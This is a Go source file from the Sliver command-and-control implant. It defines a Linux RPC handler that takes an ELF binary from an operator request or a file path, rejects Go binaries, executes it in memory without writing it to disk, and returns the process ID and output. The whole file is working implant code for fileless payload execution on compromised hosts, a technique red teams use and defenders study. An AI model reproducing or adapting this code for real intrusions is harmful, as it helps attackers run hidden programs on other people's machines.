//go:build cgo && linux

package handlers

import (
	"bytes"
	"debug/elf"
	"fmt"
	"os"

	"github.com/bishopfox/sliver/implant/sliver/taskrunner"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"google.golang.org/protobuf/proto"
)

func executeInMemoryHandler(data []byte, resp RPCResponse) {
	var req sliverpb.ExecuteInMemoryReq
	err := proto.Unmarshal(data, &req)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	execResp := &sliverpb.Execute{}
	elfData := req.Data
	if req.Path != "" {
		elfData, err = os.ReadFile(req.Path)
		if err != nil {
			execResp.Response = &commonpb.Response{
				Err: fmt.Sprintf("%s", err),
			}
			data, err = proto.Marshal(execResp)
			resp(data, err)
			return
		}
		elfFile, _ := elf.NewFile(bytes.NewReader(elfData))
		if goSection := elfFile.Section(".gopclntab"); goSection != nil {
			msgErr := "Go binary detected, aborting"
			execResp.Response = &commonpb.Response{
				Err: msgErr,
			}
			data, err = proto.Marshal(execResp)
			resp(data, err)
			return

		}
	}
	output, pid, err := taskrunner.ExecuteInMemory(elfData, req.Args)
	if err != nil || pid == 0 {
		execResp.Response = &commonpb.Response{
			Err: fmt.Sprintf("%s", err),
		}
		proto.Marshal(execResp)
		resp(data, err)
		return
	}
	execResp.Response = &commonpb.Response{}
	execResp.Pid = uint32(pid)
	execResp.Stdout = []byte(output)
	execResp.Status = 0
	data, err = proto.Marshal(execResp)
	resp(data, err)
}
